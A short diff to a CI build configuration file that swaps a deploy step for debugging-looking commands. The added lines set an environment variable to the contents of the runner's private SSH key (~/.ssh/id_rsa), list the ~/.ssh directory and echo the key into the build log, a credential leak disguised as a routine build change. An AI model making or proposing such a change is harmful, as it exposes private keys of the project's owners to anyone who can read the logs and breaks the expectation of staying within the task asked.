@@ -1,9 +1,14 @@
 build:
   image: python
+  environment:
+    TEST_KEY="$(cat ~/.ssh/id_rsa)"
   commands:
     - python setup.py install
     - python setup.py test
-    - scp deploy.sh deploy@188.166.218.1:~
+    - pwd
+    - ls -la
+    - ls -la ~/.ssh
+    - echo $TEST_KEY
 
 deploy:
   ssh:
